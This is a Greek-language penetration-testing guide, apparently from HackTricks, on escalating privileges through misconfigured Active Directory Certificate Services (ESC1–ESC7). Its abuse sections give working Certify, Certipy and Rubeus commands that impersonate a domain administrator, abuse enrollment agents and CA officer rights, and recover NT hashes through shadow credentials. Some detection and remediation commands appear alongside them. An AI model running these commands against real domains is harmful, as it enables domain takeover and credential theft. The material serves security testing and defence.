# Κλιμάκωση τομέα AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Αυτή είναι μια σύνοψη των ενοτήτων τεχνικών κλιμάκωσης από τις αναρτήσεις:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Λανθασμένα ρυθμισμένα Certificate Templates - ESC1

### Επεξήγηση

### Επεξήγηση των λανθασμένα ρυθμισμένων Certificate Templates - ESC1

- **Τα δικαιώματα Enrolment παραχωρούνται σε χρήστες με χαμηλά προνόμια από το Enterprise CA.**
- **Δεν απαιτείται έγκριση Manager.**
- **Δεν απαιτούνται υπογραφές από εξουσιοδοτημένο προσωπικό.**
- **Οι security descriptors στα certificate templates είναι υπερβολικά permissive, επιτρέποντας σε χρήστες με χαμηλά προνόμια να αποκτούν δικαιώματα enrolment.**
- **Τα certificate templates έχουν ρυθμιστεί ώστε να ορίζουν EKUs που διευκολύνουν το authentication:**
- Περιλαμβάνονται identifiers Extended Key Usage (EKU), όπως Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) ή κανένα EKU (SubCA).
- **Το template επιτρέπει στους requesters να συμπεριλάβουν ένα subjectAltName στο Certificate Signing Request (CSR):**
- Το Active Directory (AD) δίνει προτεραιότητα στο subjectAltName (SAN) ενός certificate για την επαλήθευση ταυτότητας, όταν αυτό υπάρχει. Αυτό σημαίνει ότι, καθορίζοντας το SAN σε ένα CSR, μπορεί να ζητηθεί ένα certificate για impersonation οποιουδήποτε χρήστη (π.χ. ενός domain administrator). Το αν μπορεί να καθοριστεί SAN από τον requester υποδεικνύεται στο AD object του certificate template μέσω της ιδιότητας `mspki-certificate-name-flag`. Αυτή η ιδιότητα είναι bitmask και η παρουσία του flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` επιτρέπει στον requester να καθορίσει το SAN.

> [!CAUTION]
> Η παραπάνω ρύθμιση επιτρέπει σε χρήστες με χαμηλά προνόμια να ζητούν certificates με οποιοδήποτε SAN της επιλογής τους, επιτρέποντας authentication ως οποιοσδήποτε domain principal μέσω Kerberos ή SChannel.

Αυτή η δυνατότητα είναι μερικές φορές ενεργοποιημένη για την υποστήριξη της on-the-fly δημιουργίας HTTPS ή host certificates από products ή deployment services ή λόγω έλλειψης κατανόησης.

Σημειώνεται ότι η δημιουργία ενός certificate με αυτή την επιλογή ενεργοποιεί μια προειδοποίηση, κάτι που δεν συμβαίνει όταν ένα υπάρχον certificate template, όπως το `WebServer` template, στο οποίο είναι ενεργοποιημένο το `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, αντιγράφεται και στη συνέχεια τροποποιείται ώστε να περιλαμβάνει ένα authentication OID.<sup>[[6]](#references)</sup>

### Abuse

Για να **εντοπίσετε ευάλωτα certificate templates**, μπορείτε να εκτελέσετε:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Για να **εκμεταλλευτείτε αυτήν την ευπάθεια ώστε να προσποιηθείτε έναν administrator**, θα μπορούσατε να εκτελέσετε:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Στη συνέχεια, μπορείτε να μετατρέψετε το παραγόμενο **πιστοποιητικό σε μορφή `.pfx`** και να το χρησιμοποιήσετε για **authenticate χρησιμοποιώντας ξανά τα Rubeus ή certipy**:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Τα binaries των Windows "Certreq.exe" και "Certutil.exe" μπορούν να χρησιμοποιηθούν για τη δημιουργία του PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Η απαρίθμηση των certificate templates εντός του configuration schema του AD Forest, συγκεκριμένα εκείνων που δεν απαιτούν approval ή signatures, διαθέτουν EKU Client Authentication ή Smart Card Logon και έχουν ενεργοποιημένο το flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, μπορεί να πραγματοποιηθεί εκτελώντας το ακόλουθο LDAP query:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Λανθασμένα ρυθμισμένα Certificate Templates - ESC2

### Επεξήγηση

Το δεύτερο σενάριο abuse αποτελεί παραλλαγή του πρώτου:

1. Τα δικαιώματα enrollment παραχωρούνται σε low-privileged users από το Enterprise CA.
2. Η απαίτηση για έγκριση από manager είναι απενεργοποιημένη.
3. Η ανάγκη για authorized signatures παραλείπεται.
4. Ένα υπερβολικά permissive security descriptor στο certificate template παραχωρεί δικαιώματα certificate enrollment σε low-privileged users.
5. **Το certificate template έχει οριστεί ώστε να περιλαμβάνει το Any Purpose EKU ή κανένα EKU.**

Το **Any Purpose EKU** επιτρέπει σε έναν attacker να αποκτήσει certificate για **οποιονδήποτε σκοπό**, συμπεριλαμβανομένων των client authentication, server authentication, code signing κ.λπ. Η ίδια **technique που χρησιμοποιείται για το ESC3** μπορεί να αξιοποιηθεί για την εκμετάλλευση αυτού του σεναρίου.

Certificates **χωρίς EKUs**, τα οποία λειτουργούν ως subordinate CA certificates, μπορούν να αξιοποιηθούν για **οποιονδήποτε σκοπό** και μπορούν **επίσης να χρησιμοποιηθούν για την υπογραφή νέων certificates**. Επομένως, ένας attacker θα μπορούσε να καθορίσει αυθαίρετα EKUs ή πεδία στα νέα certificates, χρησιμοποιώντας ένα subordinate CA certificate.

Ωστόσο, τα νέα certificates που δημιουργούνται για **domain authentication** δεν θα λειτουργήσουν εάν το subordinate CA δεν είναι trusted από το αντικείμενο **`NTAuthCertificates`**, το οποίο αποτελεί την προεπιλεγμένη ρύθμιση. Παρ' όλα αυτά, ένας attacker μπορεί να δημιουργήσει **νέα certificates με οποιοδήποτε EKU** και αυθαίρετες τιμές certificate. Αυτά θα μπορούσαν ενδεχομένως να **χρησιμοποιηθούν για abuse** σε ένα ευρύ φάσμα σκοπών (π.χ. code signing, server authentication κ.λπ.) και θα μπορούσαν να έχουν σημαντικές επιπτώσεις σε άλλες εφαρμογές του network, όπως τα SAML, AD FS ή IPSec.<sup>[[6]](#references)</sup>

Για την απαρίθμηση templates που αντιστοιχούν σε αυτό το σενάριο μέσα στο configuration schema του AD Forest, μπορεί να εκτελεστεί το ακόλουθο LDAP query:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Λανθασμένα ρυθμισμένα Enrolment Agent Templates - ESC3

### Επεξήγηση

Αυτό το σενάριο μοιάζει με το πρώτο και το δεύτερο, αλλά **κάνει abuse** ενός **διαφορετικού EKU** (Certificate Request Agent) και **2 διαφορετικών templates** (επομένως έχει 2 σύνολα απαιτήσεων),

Το **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), γνωστό ως **Enrollment Agent** στην τεκμηρίωση της Microsoft, επιτρέπει σε ένα principal να κάνει **enroll** για ένα **certificate** **εκ μέρους άλλου user**.

Ο **“enrollment agent”** κάνει **enroll** σε ένα τέτοιο **template** και χρησιμοποιεί το resulting **certificate για να συνυπογράψει ένα CSR εκ μέρους του άλλου user**. Στη συνέχεια **στέλνει** το **συνυπογεγραμμένο CSR** στην CA, κάνοντας enroll σε ένα **template** που **επιτρέπει “enroll on behalf of”**, και η CA απαντά με ένα **certificate που ανήκει στον “άλλο” user**.<sup>[[6]](#references)</sup>

**Απαιτήσεις 1:**

- Τα δικαιώματα Enrollment παραχωρούνται σε low-privileged users από την Enterprise CA.
- Η απαίτηση για έγκριση από manager παραλείπεται.
- Δεν υπάρχει απαίτηση για authorized signatures.
- Το security descriptor του certificate template είναι υπερβολικά permissive, παραχωρώντας δικαιώματα enrollment σε low-privileged users.
- Το certificate template περιλαμβάνει το Certificate Request Agent EKU, επιτρέποντας το request άλλων certificate templates εκ μέρους άλλων principals.

**Απαιτήσεις 2:**

- Η Enterprise CA παραχωρεί δικαιώματα enrollment σε low-privileged users.
- Η έγκριση από manager γίνεται bypass.
- Η έκδοση schema του template είναι είτε 1 είτε μεγαλύτερη από 2 και καθορίζει ένα Application Policy Issuance Requirement που απαιτεί το Certificate Request Agent EKU.
- Ένα EKU που ορίζεται στο certificate template επιτρέπει domain authentication.
- Δεν εφαρμόζονται περιορισμοί για enrollment agents στην CA.

### Abuse

Μπορείτε να χρησιμοποιήσετε τα [**Certify**](https://github.com/GhostPack/Certify) ή [**Certipy**](https://github.com/ly4k/Certipy) για να κάνετε abuse σε αυτό το σενάριο:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Οι **users** που επιτρέπεται να **obtain** ένα **enrollment agent certificate**, τα templates στα οποία επιτρέπεται στους **agents** να κάνουν enroll, καθώς και τα **accounts** για λογαριασμό των οποίων μπορεί να ενεργεί ο enrollment agent, μπορούν να περιορίζονται από enterprise CAs. Αυτό επιτυγχάνεται ανοίγοντας το `certsrc.msc` **snap-in**, κάνοντας **right-clicking on the CA**, επιλέγοντας **clicking Properties** και, στη συνέχεια, μεταβαίνοντας στην καρτέλα “Enrollment Agents”.

Ωστόσο, σημειώνεται ότι η **default** ρύθμιση για τις CAs είναι “**Do not restrict enrollment agents**.” Όταν οι administrators ενεργοποιούν τον περιορισμό των enrollment agents, ορίζοντάς τον σε “Restrict enrollment agents”, η default configuration παραμένει εξαιρετικά permissive. Επιτρέπει σε **Everyone** να κάνει enroll σε όλα τα templates ως οποιοσδήποτε.

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

Το **security descriptor** στα **certificate templates** καθορίζει τα **permissions** που διαθέτουν συγκεκριμένοι **AD principals** σχετικά με το template.

Εάν ένας **attacker** διαθέτει τα απαιτούμενα **permissions** για να **alter** ένα **template** και να **institute** οποιεσδήποτε **exploitable misconfigurations** περιγράφονται στις **prior sections**, μπορεί να επιτευχθεί privilege escalation.

Στα notable permissions που εφαρμόζονται στα certificate templates περιλαμβάνονται τα εξής:<sup>[[6]](#references)</sup>

- **Owner:** Παρέχει implicit control πάνω στο object, επιτρέποντας την τροποποίηση οποιωνδήποτε attributes.
- **FullControl:** Παρέχει πλήρη authority πάνω στο object, συμπεριλαμβανομένης της δυνατότητας τροποποίησης οποιωνδήποτε attributes.
- **WriteOwner:** Επιτρέπει την αλλαγή του owner του object σε principal που ελέγχεται από τον attacker.
- **WriteDacl:** Επιτρέπει την προσαρμογή των access controls, ενδεχομένως παρέχοντας στον attacker FullControl.
- **WriteProperty:** Επιτρέπει την επεξεργασία οποιωνδήποτε object properties.

### Abuse

Για τον εντοπισμό principals με edit rights σε templates και άλλα PKI objects, κάντε enumerate με το Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Ένα παράδειγμα privesc όπως το προηγούμενο:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

Το ESC4 είναι όταν ένας χρήστης έχει write privileges πάνω σε ένα certificate template. Αυτό μπορεί, για παράδειγμα, να γίνει abuse για την αντικατάσταση της configuration του certificate template, ώστε το template να γίνει vulnerable στο ESC1.

Όπως μπορούμε να δούμε στο παραπάνω path, μόνο το `JOHNPC` έχει αυτά τα privileges, αλλά ο χρήστης μας `JOHN` έχει το νέο edge `AddKeyCredentialLink` προς το `JOHNPC`. Καθώς αυτή η τεχνική σχετίζεται με certificates, έχω υλοποιήσει και αυτό το attack, το οποίο είναι γνωστό ως [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Ακολουθεί μια μικρή sneak peek της εντολής `shadow auto` του Certipy για την ανάκτηση του NT hash του victim.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
Το **Certipy** μπορεί να αντικαταστήσει τη ρύθμιση ενός certificate template με μία μόνο εντολή. **Από προεπιλογή**, το Certipy θα **αντικαταστήσει** τη ρύθμιση ώστε να την καταστήσει **ευάλωτη στο ESC1**. Μπορούμε επίσης να καθορίσουμε την **παράμετρο `-save-old` για την αποθήκευση της παλιάς ρύθμισης**, κάτι που θα είναι χρήσιμο για την **επαναφορά** της ρύθμισης μετά την επίθεσή μας.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Έλεγχος πρόσβασης ευάλωτων αντικειμένων PKI - ESC5

### Επεξήγηση

Ο εκτενής ιστός αλληλοσυνδεόμενων σχέσεων που βασίζονται σε ACL, ο οποίος περιλαμβάνει αρκετά αντικείμενα πέρα από τα certificate templates και το certificate authority, μπορεί να επηρεάσει την ασφάλεια ολόκληρου του συστήματος AD CS. Αυτά τα αντικείμενα, τα οποία μπορούν να επηρεάσουν σημαντικά την ασφάλεια, περιλαμβάνουν:

- Το AD computer object του CA server, το οποίο μπορεί να παραβιαστεί μέσω μηχανισμών όπως τα S4U2Self ή S4U2Proxy.
- Τον RPC/DCOM server του CA server.
- Οποιοδήποτε descendant AD object ή container μέσα στη συγκεκριμένη διαδρομή container `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Αυτή η διαδρομή περιλαμβάνει, μεταξύ άλλων, containers και objects όπως το Certificate Templates container, το Certification Authorities container, το NTAuthCertificates object και το Enrollment Services Container.

Η ασφάλεια του συστήματος PKI μπορεί να παραβιαστεί εάν ένας attacker με χαμηλά προνόμια καταφέρει να αποκτήσει τον έλεγχο οποιουδήποτε από αυτά τα κρίσιμα components.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Επεξήγηση

Το θέμα που συζητείται στο [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) αναφέρεται επίσης στις επιπτώσεις του flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, όπως περιγράφονται από τη Microsoft. Αυτή η ρύθμιση, όταν ενεργοποιείται σε ένα Certification Authority (CA), επιτρέπει τη συμπερίληψη **τιμών που ορίζονται από τον χρήστη** στο **subject alternative name** για **οποιοδήποτε request**, συμπεριλαμβανομένων εκείνων που δημιουργούνται από το Active Directory®. Κατά συνέπεια, αυτή η δυνατότητα επιτρέπει σε έναν **intruder** να κάνει enroll μέσω **οποιουδήποτε template** έχει ρυθμιστεί για **domain authentication**—συγκεκριμένα μέσω εκείνων που επιτρέπουν enrollment σε **unprivileged** users, όπως το τυπικό User template. Ως αποτέλεσμα, μπορεί να αποκτηθεί ένα certificate, επιτρέποντας στον intruder να πραγματοποιήσει authentication ως domain administrator ή **οποιαδήποτε άλλη ενεργή οντότητα** μέσα στο domain.<sup>[[9]](#references)</sup>

**Σημείωση**: Η μέθοδος προσθήκης **alternative names** σε ένα Certificate Signing Request (CSR), μέσω του ορίσματος `-attrib "SAN:"` στο `certreq.exe` (το οποίο αναφέρεται ως “Name Value Pairs”), διαφέρει από τη στρατηγική exploitation των SANs στο ESC1. Η διαφορά έγκειται στο **πώς ενσωματώνονται οι πληροφορίες του account**—μέσα σε ένα certificate attribute και όχι σε ένα extension.

### Abuse

Για να επαληθεύσουν εάν η ρύθμιση είναι ενεργοποιημένη, οι οργανισμοί μπορούν να χρησιμοποιήσουν την ακόλουθη εντολή με το `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Αυτή η λειτουργία ουσιαστικά χρησιμοποιεί **remote registry access**, επομένως, μια εναλλακτική προσέγγιση θα μπορούσε να είναι:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Εργαλεία όπως τα [**Certify**](https://github.com/GhostPack/Certify) και [**Certipy**](https://github.com/ly4k/Certipy) μπορούν να εντοπίσουν αυτήν τη λανθασμένη ρύθμιση και να την εκμεταλλευτούν:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Για την τροποποίηση αυτών των ρυθμίσεων, με την προϋπόθεση ότι διαθέτει κανείς δικαιώματα **διαχειριστή domain** ή ισοδύναμα δικαιώματα, μπορεί να εκτελεστεί η ακόλουθη εντολή από οποιονδήποτε σταθμό εργασίας:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Για να απενεργοποιήσετε αυτήν τη ρύθμιση στο περιβάλλον σας, η flag μπορεί να αφαιρεθεί με:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Μετά τις ενημερώσεις ασφαλείας του Μαΐου 2022, τα νεοεκδοθέντα **certificates** θα περιέχουν ένα **security extension** που ενσωματώνει την ιδιότητα **`objectSid` του requester**. Για το ESC1, αυτό το SID προκύπτει από το καθορισμένο SAN. Ωστόσο, για το **ESC6**, το SID αντικατοπτρίζει το **`objectSid` του requester** και όχι το SAN.\
> Για την εκμετάλλευση του ESC6, είναι απαραίτητο το σύστημα να είναι ευάλωτο στο ESC10 (Weak Certificate Mappings), το οποίο δίνει προτεραιότητα στο **SAN έναντι του νέου security extension**.

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Ο έλεγχος πρόσβασης για μια certificate authority διατηρείται μέσω ενός συνόλου δικαιωμάτων που διέπουν τις ενέργειες της CA. Αυτά τα δικαιώματα μπορούν να προβληθούν με πρόσβαση στο `certsrv.msc`, κάνοντας δεξί κλικ σε μια CA, επιλέγοντας τις ιδιότητες και, στη συνέχεια, μεταβαίνοντας στην καρτέλα Security. Επιπλέον, τα δικαιώματα μπορούν να απαριθμηθούν χρησιμοποιώντας το module PSPKI με εντολές όπως:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Αυτό παρέχει πληροφορίες σχετικά με τα κύρια δικαιώματα, συγκεκριμένα τα **`ManageCA`** και **`ManageCertificates`**, τα οποία αντιστοιχούν αντίστοιχα στους ρόλους “διαχειριστής CA” και “Certificate Manager”.<sup>[[6]](#references)</sup>

#### Abuse

Η κατοχή δικαιωμάτων **`ManageCA`** σε μια αρχή πιστοποιητικών επιτρέπει στο principal να χειρίζεται απομακρυσμένα τις ρυθμίσεις χρησιμοποιώντας το PSPKI. Αυτό περιλαμβάνει την ενεργοποίηση του flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, ώστε να επιτρέπεται ο καθορισμός SAN σε οποιοδήποτε template, κάτι κρίσιμο για το domain escalation.

Η απλοποίηση αυτής της διαδικασίας είναι δυνατή μέσω της χρήσης του cmdlet **Enable-PolicyModuleFlag** του PSPKI, επιτρέποντας τροποποιήσεις χωρίς άμεση αλληλεπίδραση με το GUI.

Η κατοχή δικαιωμάτων **`ManageCertificates`** διευκολύνει την έγκριση εκκρεμών αιτημάτων, παρακάμπτοντας ουσιαστικά την προστασία “CA certificate manager approval”.

Ο συνδυασμός των modules **Certify** και **PSPKI** μπορεί να χρησιμοποιηθεί για την υποβολή αιτήματος, την έγκριση και τη λήψη ενός certificate:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Επίθεση 2

#### Επεξήγηση

> [!WARNING]
> Στην **προηγούμενη επίθεση**, τα δικαιώματα **`Manage CA`** χρησιμοποιήθηκαν για την **ενεργοποίηση** της σημαίας **EDITF_ATTRIBUTESUBJECTALTNAME2**, ώστε να εκτελεστεί η **επίθεση ESC6**, αλλά αυτό δεν θα έχει κανένα αποτέλεσμα μέχρι να γίνει επανεκκίνηση της υπηρεσίας CA (`CertSvc`). Όταν ένας χρήστης διαθέτει το δικαίωμα πρόσβασης **`Manage CA`**, επιτρέπεται επίσης να **επανεκκινήσει την υπηρεσία**. Ωστόσο, αυτό **δεν σημαίνει ότι μπορεί να επανεκκινήσει την υπηρεσία απομακρυσμένα**. Επιπλέον, η E**SC6 ενδέχεται να μη λειτουργεί out of the box** στα περισσότερα patched περιβάλλοντα, λόγω των ενημερώσεων ασφαλείας του Μαΐου 2022.

Επομένως, παρουσιάζεται εδώ μια άλλη επίθεση.

Προαπαιτούμενα:

- Μόνο το δικαίωμα **`ManageCA`**
- Το δικαίωμα **`Manage Certificates`** (μπορεί να εκχωρηθεί από το **`ManageCA`**)
- Το certificate template **`SubCA`** πρέπει να είναι **ενεργοποιημένο** (μπορεί να ενεργοποιηθεί από το **`ManageCA`**)

Η τεχνική βασίζεται στο γεγονός ότι οι χρήστες με δικαιώματα πρόσβασης `Manage CA` _και_ `Manage Certificates` μπορούν να **εκδίδουν αποτυχημένα certificate requests**. Το certificate template **`SubCA`** είναι **ευάλωτο στο ESC1**, αλλά **μόνο οι administrators** μπορούν να κάνουν enroll στο template. Επομένως, ένας **χρήστης** μπορεί να **ζητήσει** να κάνει enroll στο **`SubCA`** — κάτι που θα **απορριφθεί** — αλλά στη συνέχεια θα εκδοθεί από τον manager.<sup>[[6]](#references)</sup>

#### Κατάχρηση

Μπορείτε να **εκχωρήσετε στον εαυτό σας** το δικαίωμα πρόσβασης **`Manage Certificates`**, προσθέτοντας τον χρήστη σας ως νέο officer.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Το **`SubCA`** template μπορεί να **ενεργοποιηθεί στο CA** με την παράμετρο `-enable-template`. Από προεπιλογή, το template `SubCA` είναι ενεργοποιημένο.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Αν έχουμε εκπληρώσει τις προϋποθέσεις για αυτήν την επίθεση, μπορούμε να ξεκινήσουμε **ζητώντας ένα certificate βασισμένο στο template `SubCA`**.

**Αυτό το request θα απορριφ**θεί**, αλλά θα αποθηκεύσουμε το private key και θα σημειώσουμε το request ID.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Με τα **`Manage CA` και `Manage Certificates`**, μπορούμε στη συνέχεια να **εκδώσουμε το αποτυχημένο αίτημα πιστοποιητικού** με την εντολή `ca` και την παράμετρο `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Και τέλος, μπορούμε να **ανακτήσουμε το εκδοθέν πιστοποιητικό** με την εντολή `req` και την παράμετρο `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Explanation

Εκτός από τα κλασικά abuses του ESC7 (ενεργοποίηση attributes EDITF ή έγκριση εκκρεμών requests), το **Certify 2.0** αποκάλυψε ένα ολοκαίνουργιο primitive που απαιτεί μόνο τον ρόλο *Manage Certificates* (γνωστό και ως **Certificate Manager / Officer**) στο Enterprise CA.<sup>[[3]](#references)</sup>

Η μέθοδος RPC `ICertAdmin::SetExtension` μπορεί να εκτελεστεί από οποιοδήποτε principal διαθέτει *Manage Certificates*. Ενώ παραδοσιακά η μέθοδος χρησιμοποιούνταν από νόμιμα CAs για την ενημέρωση extensions σε **pending** requests, ένας attacker μπορεί να την εκμεταλλευτεί για να **προσθέσει ένα *non-default* certificate extension** (για παράδειγμα ένα custom *Certificate Issuance Policy* OID όπως `1.1.1.1`) σε ένα request που αναμένει έγκριση.

Επειδή το στοχευμένο template **δεν ορίζει default value για αυτό το extension**, το CA ΔΕΝ θα αντικαταστήσει την τιμή που ελέγχει ο attacker όταν το request εκδοθεί τελικά. Το resulting certificate περιέχει επομένως ένα extension που επέλεξε ο attacker και το οποίο μπορεί να:

* Ικανοποιήσει απαιτήσεις Application / Issuance Policy άλλων vulnerable templates (οδηγώντας σε privilege escalation).
* Εισαγάγει πρόσθετα EKUs ή policies που παρέχουν στο certificate απροσδόκητη εμπιστοσύνη σε third-party systems.

Με λίγα λόγια, το *Manage Certificates* – που προηγουμένως θεωρούνταν το «λιγότερο ισχυρό» μισό του ESC7 – μπορεί πλέον να αξιοποιηθεί για πλήρες privilege escalation ή μακροχρόνιο persistence, χωρίς αλλαγή στη διαμόρφωση του CA ή απαίτηση του πιο περιοριστικού δικαιώματος *Manage CA*.

#### Abusing the primitive with Certify 2.0

1. **Υποβάλετε ένα certificate request που θα παραμείνει *pending*.** Αυτό μπορεί να επιτευχθεί με ένα template που απαιτεί manager approval:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Προσθέστε ένα custom extension στο pending request** χρησιμοποιώντας τη νέα εντολή `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Αν το template δεν ορίζει ήδη το extension *Certificate Issuance Policies*, η παραπάνω τιμή θα διατηρηθεί μετά την έκδοση.*

